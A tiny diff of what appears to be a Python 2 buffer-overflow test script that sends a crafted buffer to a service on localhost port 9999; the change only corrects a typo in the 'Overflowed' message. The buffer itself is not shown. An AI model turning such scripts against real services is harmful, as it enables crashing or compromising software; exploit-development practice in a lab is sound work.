@@ -12,6 +12,6 @@ try:
     s.connect(('127.0.0.1', 9999))
     data = s.recv(1024)
     s.send(buffer + '\r\n')
-    print "\nOverflowefed"
+    print "\nOverflowed"
 except:
     print "could not connect to application"
